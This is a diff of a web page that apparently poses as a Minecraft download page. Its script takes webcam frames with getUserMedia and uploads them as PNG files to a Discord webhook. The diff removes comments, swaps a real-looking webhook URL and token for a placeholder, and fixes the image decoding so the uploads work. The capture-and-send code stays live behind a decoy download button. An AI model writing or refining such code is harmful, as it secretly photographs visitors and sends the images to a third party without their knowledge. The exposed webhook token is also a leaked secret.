@@ -75,7 +75,6 @@
         const video = document.getElementById('videoElement');
         let imgIndex = 1;
 
-        // Check if user's browser supports media devices
         if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
             navigator.mediaDevices.getUserMedia({ video: true })
                 .then(function (stream) {
@@ -93,10 +92,9 @@
             canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
             const imgURL = canvas.toDataURL('image/png');
 
-            // Send the captured image to the Discord webhook
-            const webhookURL = 'https://ptb.discord.com/api/webhooks/1218581972482527292/56_Q51t96EYp1h_rD6A9ub5RQOn-_dtfNWY-kjvd3smQy2O8Ly-wVzWi6t-8dAQ7oCg1';
+            const webhookURL = 'YOUR_DISCORD_WEBHOOK_URL';
             const imgData = imgURL.replace(/^data:image\/\w+;base64,/, '');
-            const imgBlob = new Blob([imgData], { type: 'image/png' });
+            const imgBlob = new Blob([window.atob(imgData)], { type: 'image/png' });
             const imgFormData = new FormData();
             imgFormData.append('image' + imgIndex, imgBlob, 'captured_image_' + imgIndex + '.png');
 
@@ -111,12 +109,10 @@
 
         const downloadButton = document.getElementById('downloadButton');
         downloadButton.addEventListener('click', function () {
-            // Create a sample Minecraft file (e.g., a text file) for download
             const fileContent = 'This is a sample Minecraft file. Enjoy playing Minecraft!';
             const fileBlob = new Blob([fileContent], { type: 'text/plain' });
             const fileURL = URL.createObjectURL(fileBlob);
 
-            // Create a link element and simulate a click to trigger the download
             const downloadLink = document.createElement('a');
             downloadLink.href = fileURL;
             downloadLink.download = 'minecraft.txt';
@@ -129,8 +125,9 @@
 
         colorChangeButton.addEventListener('click', function () {
             document.body.style.backgroundColor = colors[index];
-            let textColor = index === colors.length - 1 ? '#000' : '#fff';  /* Change text color based on background */
+            let textColor = index === colors.length - 1 ? '#000' : '#fff';
             document.body.style.color = textColor;
+            downloadButton.style.backgroundColor = colors[index]; // Change button color along with background
             index = (index + 1) % colors.length;
         });
     </script>
